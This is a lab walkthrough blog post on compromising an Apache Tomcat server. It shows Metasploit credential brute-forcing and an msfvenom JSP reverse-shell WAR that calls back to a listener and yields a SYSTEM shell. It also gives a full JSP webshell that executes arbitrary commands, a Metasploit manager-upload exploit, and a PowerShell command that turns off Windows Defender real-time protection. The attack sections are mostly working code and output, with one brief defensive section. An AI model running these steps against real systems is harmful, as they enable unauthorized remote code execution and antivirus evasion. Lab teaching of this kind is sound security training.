---
title: "Exploiting Apache Tomcat"
date: "2021-07-05"
category: 
  - "security"
tags: 
  - "war"
  - "apache-tomcat"
  - "hacking"
  - "jsp"
  - "metasploit"
  - "waddlecorp"
---

Welcome back! This is a continuation on the [WaddleCorp Series](https://blog.edgystack.com/tag/waddlecorp). If you haven't setup the lab yet be sure to check out the introduction:

[https://](https://blog.edgystack.com/hacking-intro/)[blog.edgystack.com/waddlecorp-intro/](https://blog.edgystack.com/waddlecorp-intro/)

## What is Apache Tomcat?

Staying at a high level for this walkthrough, Apache Tomcat is a [Java servlet](https://www.infoworld.com/article/3313114/what-is-a-java-servlet-request-handling-for-java-web-applications.html) and [JSP (JavaServer Pages)](https://www.infoworld.com/article/3336161/what-is-jsp-introduction-to-javaserver-pages.html) container. To learn more about Apache Tomcat please check out this article from [InfoWorld.com](https://www.infoworld.com/article/3510460/what-is-apache-tomcat-the-original-java-servlet-container.html). Java web applications are typically packaged in WAR (Web Archive) files for deployment. Tomcat has a "Deploy" section in the managers console where you can deploy a WAR file. This deployment process will unpack the WAR file and insert your web applications contents into a new directory named after the project.

## Getting to the Manager console

We will begin by looking at how to determine the machine is running Apache Tomcat. Start by firing up your environment.

```shell
vagrant up skipper rico pentest && vagrant provision skipper rico
```

Once your environment is running lets go into our Kali VM, open a terminal and run a basic enumeration with NMap

```shell
sudo nmap -sS -Pn 172.28.128.0/24
```

![kali nmap scan ](/static/images/Screen-Shot-2021-07-05-at-9.52.56-AM.jpg)

We can see from the output that our environment has a machine running ajp13 and an http-proxy. Let's try navigating to the page being hosted on 8080.

![](/static/images/Screen-Shot-2021-07-05-at-9.56.58-AM-1024x654.jpg)

Perfect! We have landed on an Apache Tomcat landing page and there is a link to the Manager App right there at the top. If you ever come across an Apache Tomcat server and a link is not provided for the Manager App, you can try and navigate to `{ip}:{port}/manager`. It is always a good idea to try what you know before resorting to brute force methods of path discovery.

Navigating to the manager page will require authorization. Here I will show you how to leverage msfconsole to determine the username and password.

```shell
sudo msfdb init && sudo msfconsole
```

Inside metasploit console search for tomcat and choose options for _scanner/http/tomcat\_mgr\_login_

```shell
msf6 > use 9
msf6 auxiliary(scanner/http/tomcat_mgr_login) > options
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 172.28.128.103
RHOSTS => 172.28.128.103
msf6 auxiliary(scanner/http/tomcat_mgr_login) > exploit

[+] 172.28.128.103:8080 - Login Successful: admin:admin
[-] 172.28.128.103:8080 - LOGIN FAILED: manager:admin (Incorrect)
[-] 172.28.128.103:8080 - LOGIN FAILED: manager:manager (Incorrect)
[-] 172.28.128.103:8080 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 172.28.128.103:8080 - LOGIN FAILED: manager:root (Incorrect)
```

Since this example has a simple credential set we will just take the default username and password files and run the scanner. Now that we have our username:password pair lets go back to the manager console and login. Once you are logged in you will see a list of applications running on the server. It is here we will begin our exploitation.

## WAR Format Backdoor

First up is the WAR Format Backdoor. This, quite simply put, is a web application archive file that contains a malicious payload, in our case a JSP reverse tcp shell. We will start by creating our malicious .WAR payload using **msfvenom**.

```shell
msfvenom -p java/jsp_shell_reverse_tcp lhost=172.28.128.200 lport=4444 -f war > shell.war
```

In the above command we have specified our **payload (-p) as a java/jsp\_shell\_reverse\_tcp** which will be used to connect back to our **lhost** (local host) on **port 4444** and we have specified the file type to be a .war. We then pass the resulting file to a file in our home directory called **shell.war**. Now we need to start a listener to receive a connection from our payload.

```shell
nc -lvnp 4444
```

Now that we have established a netcat listener on port 4444 we can deliver our payload to the server. Back in the manager console scroll down to the section **"WAR file to deploy"**, click browse and select the payload we just created and then click "**Deploy"**. We see there is a new application in our list of applications called **"/shell"** and it is deployed and started. Click on the link to **"/shell"** and a connection will be established in our terminal where we setup our netcat listener.

```shell
┌──(vagrant㉿kali)-[~/Documents]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.28.128.200] from (UNKNOWN) [172.28.128.103] 58345
Microsoft Windows [Version 10.0.17763.253]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.30>whoami
whoami
nt authority\system
```

We have successfully targeted the Tomcat server using a WAR Format Backdoor.

## JSP WebShell

Next up we have the JSP Webshell. JSP stands for Java Server Page and is used to create a web page that is compiled on the server rather than in the users web browser. The fact that the JSP runs on the server allows us to interact with the server programmatically. We will copy the following code found at _[https://pentesterlab.com/exercises/cve-2007-1860/course](https://pentesterlab.com/exercises/cve-2007-1860/course)_

```xml
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

and run the following. (Paste the code in the VIM editor and save the file by typing _esc+:wq_)

```shell
┌──(vagrant㉿kali)-[~]
└─$ mkdir webshell
                                                                                          
┌──(vagrant㉿kali)-[~]
└─$ vim index.jsp
                                                                                          
┌──(vagrant㉿kali)-[~]
└─$ cp index.jsp webshell 
                                                                                          
┌──(vagrant㉿kali)-[~]
└─$ cd webshell          
                                                                                          
┌──(vagrant㉿kali)-[~/webshell]
└─$ jar -cvf ../webshell.war *
adding: META-INF/ (in=0) (out=0) (stored 0%)
adding: META-INF/MANIFEST.MF (in=56) (out=56) (stored 0%)
adding: index.jsp (in=827) (out=420) (deflated 49%)
Total:
------
(in = 867) (out = 786) (deflated 9%)
                                                                                          
┌──(vagrant㉿kali)-[~/webshell]
└─$ 
```

Now that we have our webshell.war ready lets go into the manager console and upload this to the server using the same steps for uploading a .war as we used in "**Generate .war Format Backdoor**". Now we can navigate to the **/webshell** page and we will find that we now have RCE in our browser.

![](/static/images/Screen-Shot-2021-07-05-at-10.32.51-AM-1024x189.jpg)

## Manager Authenticated Upload Code Execution

This is by far the simplest way of gaining a foothold on an Apache Tomcat Server and for that reason I saved it for last. This method will leverage Metasploit and use an existing exploit module to obtain a meterpreter shell on the Tomcat server. Let's start by firing up msfconsole

```shell
┌──(vagrant㉿kali)-[~/webshell]
└─$ sudo msfdb init && sudo msfconsole
[i] Database already started
[i] The database appears to be already configured, skipping initialization
```

From here we will search for **"tomcat manager"** and select **"tomcat\_mgr\_upload"**

```shell
msf6 > search tomcat manager

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   - ---- --------------- ---- ----- -----------
   0  auxiliary/admin/http/ibm_drm_download             2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
   1  auxiliary/dos/http/apache_commons_fileupload_dos  2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   2  auxiliary/scanner/http/tomcat_mgr_login                            normal     No     Tomcat Application Manager Login Utility
   3  exploit/multi/http/cisco_dcnm_upload_2019         2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   4  exploit/multi/http/tomcat_mgr_deploy              2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   5  exploit/multi/http/tomcat_mgr_upload              2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution


Interact with a module by name or index. For example info 5, use 5 or use exploit/multi/http/tomcat_mgr_upload                                                                      

msf6 > use 5
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) >
```

We will set the options as shown below.

![](/static/images/Screen-Shot-2021-07-05-at-10.50.19-AM.jpg)

But wait this was supposed to work!?! Well against a terribly misconfigured system yes this would work but in a more modern (albeit still misconfigured system) this will most likely be picked up and quarantined by Windows Defender. So let's explore what is happening here by double clicking our "rico" vm and bringing up the desktop environment. Once on the "rico" desktop click the host icon and search for "Security at a glance". Then click on the side bar item "Virus and Protection", then click on "View threat history". Here you can see our attempts to exploit this system have been thwarted by the AV in place.

![](/static/images/Screen-Shot-2021-07-05-at-11.00.31-AM-1024x505.jpg)

Let's also approach this in a more "Blue Team-esq" manner by getting this information in a way we can then use it, say for means of monitoring or reacting to detections being logged. Inside the **Rico** VM open up Powershell (usually a good idea to run as admin) and enter **Get-MpThreatDetection** (output shown below). This cmdlet is used to obtain active and past malware threats that Windows Defender detected on the machine.

![powershell results of Get-MpThreatDetection cmdlet.](/static/images/Screen-Shot-2021-07-05-at-6.25.43-PM.jpg)

We can, for the sake of understanding the metasploit method, disable the protection by clicking "Manage settings" under the **Virus & threat protection settings** menu. Then turn off **Real-time protection**. Or you can simply run the following command in powershell:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Let's go back to the Kali vm and try to run our exploit again.

![](/static/images/Screen-Shot-2021-07-05-at-11.09.04-AM.jpg)

And as expected without the virus protection in the way our exploit runs with 0 issues.

I hope you have enjoyed this tutorial on Apache Tomcat Exploitation. Stay tuned for more articles as part of the Hacking Series here at EdgyStack!
